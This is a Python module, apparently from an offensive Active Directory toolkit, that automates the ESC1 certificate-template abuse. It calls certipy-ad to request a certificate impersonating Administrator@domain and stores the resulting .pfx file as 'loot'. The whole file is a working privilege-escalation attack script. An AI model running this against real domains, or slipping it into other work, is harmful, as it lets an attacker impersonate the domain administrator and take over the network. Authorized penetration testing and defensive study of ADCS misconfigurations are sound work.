# modules/adcs/esc1.py

import os
from core.helpers import run_command, save_loot
from core.colors import red, green, yellow, blue

def abuse_esc1(session, template_name):
    print(blue(f"[*] Attempting ESC1 abuse using template: {template_name}"))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA information available in session metadata. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] CA name is missing or invalid."))
        return

    output_file = f"esc1_{template_name}.pfx"
    upn = f"Administrator@{session.domain}"

    cmd = [
        "certipy-ad", "req",
        "-u", session.username,
        "-p", session.password,
        "-dc-ip", session.dc_ip,
        "-template", template_name,
        "-ca", ca_name,
        "-out", output_file,
        "-upn", upn
    ]

    print(blue(f"[*] Requesting certificate using template '{template_name}' and CA '{ca_name}'..."))
    output, err = run_command(" ".join(cmd))

    if err:
        print(red(f"[!] Certipy returned error:\n{err.strip()}"))

    if not os.path.exists(output_file) or os.path.getsize(output_file) < 100:
        print(red("[-] Certificate request failed or file not created."))
        return

    with open(output_file, "rb") as f:
        save_loot(output_file, f.read(), binary=True)

    print(green(f"[+] Certificate request successful!"))
    print(green(f"[+] Certificate saved to: loot/{output_file}"))
    print(green(f"[+] UPN used: {upn}"))
